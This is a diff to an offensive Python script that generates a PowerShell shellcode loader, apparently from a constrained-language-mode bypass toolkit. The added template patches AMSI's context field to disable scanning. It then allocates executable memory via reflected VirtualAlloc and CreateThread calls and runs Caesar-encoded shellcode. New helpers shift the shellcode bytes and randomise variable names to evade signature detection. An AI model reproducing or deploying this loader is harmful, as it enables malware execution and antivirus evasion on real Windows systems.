@@ -710,48 +710,40 @@ namespace CLMBypass
 
 """
 
-PS_TEMPLATE = """
-function %s {
-    Param ($%s, $%s)
-    $%s = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
-    $%s=@()
-    $%s.GetMethods() | %% {If($_.Name -eq "GetProcAddress") {$%s+=$_}}
-    return $%s[0].Invoke($null, @(($%s.GetMethod('GetModuleHandle')).Invoke($null, @($%s)), $%s))
+PWSH_TEMPLATE="""
+function LookupFunc {
+    Param ($moduleName, $functionName)
+    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | ? { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+    $tmp=@()
+    $assem.GetMethods() | %% {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
 }
 
-function %s {
+function getDelegateType {
     Param (
-        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $%s,
-        [Parameter(Position = 1)] [Type] $%s = [Void]
+        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $brax,
+        [Parameter(Position = 1)] [Type] $delType = [Void]
     )
-    $%s = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
-    $%s.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $%s).SetImplementationFlags('Runtime, Managed')
-    $%s.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $%s, $%s).SetImplementationFlags('Runtime, Managed')
-    return $%s.CreateType()
+    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass',[System.MulticastDelegate])
+    $type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $brax).SetImplementationFlags('Runtime, Managed')
+    $type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $brax).SetImplementationFlags('Runtime, Managed')
+    return $type.CreateType()
 }
-$%s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll VirtualAlloc), (%s @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
-[Byte[]] $%s = %s 
-[System.Runtime.InteropServices.Marshal]::Copy($%s, 0, $%s, $%s.length)
-
-$%s = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll CreateThread), (%s @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$%s,[IntPtr]::Zero,0,[IntPtr]::Zero)
-[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((%s kernel32.dll WaitForSingleObject), (%s @([IntPtr], [Int32])([Int]))).Invoke($%s, 0xFFFFFFFF)
-
+$aaaa=[Ref].Assembly.GetTypes();Foreach($bbbb in $aaaa) {if ($bbbb.Name -like "*iUt*") {$cccc=$bbbb}};$dddd=$cccc.GetFields('NonPublic,Static');Foreach($eeee in $dddd) {if ($eeee.Name -like "*Contex*") {$ffff=$eeee}};$gggg=$ffff.GetValue($null);[IntPtr]$myptr=$gggg;[Int32[]]$mybuffer = @(0);[System.Runtime.InteropServices.Marshal]::Copy($mybuffer, 0, $myptr, 1)
+$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32])([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
+[Byte[]] $buf = %s
+for ($n=0;$n -le $buf.length-1;$n++) {$buf[$n] = ($buf[$n] - %s) -band 0xff}
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)
+$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr])([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)
+[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32])([Int]))).Invoke($hThread, 0xFFFFFFFF)
 """
-# dumbest possible way to do this params
-letters = string.ascii_letters
-lookupfunc = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-modulename = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-functionanme = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-getdeltype = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-funcvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-deltypevar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-typevar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-assem = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-tmpvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-lpmem= ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-bufvar = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
-hthread = ''.join(random.choice(letters) for i in range(random.randint(10,22)))
 
+def rand_vars(source, *source_vars):
+    letters = string.ascii_letters
+    # vars can't be included in other words ie func and function or shit gets fucked up
+    for i in source_vars:
+        source = source.replace(i, ''.join(random.choice(letters) for i in range(random.randint(10,22))), -1)
+    return source
 
 def format_shellcode(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
     hshellcode = ""
@@ -761,6 +753,16 @@ def format_shellcode(shellcode):
             hshellcode += f"{hex(byte)},"
         else: 
             hshellcode += f"{hex(byte)}"
+    return hshellcode
+
+def format_shellcode_caesar(shellcode, k):                                                                                                                                                                                           
+    hshellcode = ""
+    code_size = len(shellcode)                                                                                                                                                                                                                                                                                                                                                                       
+    for num, byte in enumerate(shellcode):                                                                                                                                                                                                                                                                                                                                                           
+        if num != code_size - 1: 
+            hshellcode += f"{hex((byte+k)&0xff)},"
+        else: 
+            hshellcode += f"{hex((byte+k)&0xff)}"
     return hshellcode
 
 def pretty_format_shellcode(shellcode):                                                                                                                                                                                                                                                                                                                                                                     
@@ -788,27 +790,17 @@ args = parser.parse_args()
 input_filename = args.inbin
 
 if args.type == "ps_template":
-    with open(input_filename, "rb") as file: plain_data = file.read()
-    p_shc = format_shellcode(plain_data)
-    run_txt = PS_TEMPLATE % (
-        lookupfunc, 
-        modulename, functionanme, 
-        assem,
-        tmpvar,
-        assem, tmpvar, 
-        tmpvar, assem, modulename, functionanme, 
-        getdeltype, 
-        funcvar, 
-        deltypevar, 
-        typevar, 
-        typevar, funcvar, 
-        typevar, deltypevar, funcvar, 
-        typevar, 
-        lpmem, lookupfunc, getdeltype, 
-        bufvar, p_shc, 
-        bufvar, lpmem, bufvar, 
-        hthread, lookupfunc, getdeltype, lpmem, 
-        lookupfunc, getdeltype, hthread)
+    try:
+        with open(input_filename, "rb") as file: plain_data = file.read()
+    except FileNotFoundError: 
+        print("\n\n[!] No file to parse\n")
+        exit(1)
+    # p_shc = format_shellcode(plain_data)
+    c_key = 0x02
+    p_shc = format_shellcode_caesar(plain_data, c_key)
+    run_txt = PWSH_TEMPLATE % (p_shc, c_key)
+    run_txt = rand_vars(run_txt, "LookupFunc", "moduleName", "functionName", "assem", "tmp", "getDelegateType", "brax", "delType", "type", "lpMem", "buf", "hThread", "aaaa", "bbbb", "cccc", "dddd", "eeee", "ffff", "gggg", "mybuffer", "myptr")
+    
     if args.verbose:
         print(run_txt)
     with open("run.txt", "w") as f_run: f_run.write(run_txt)
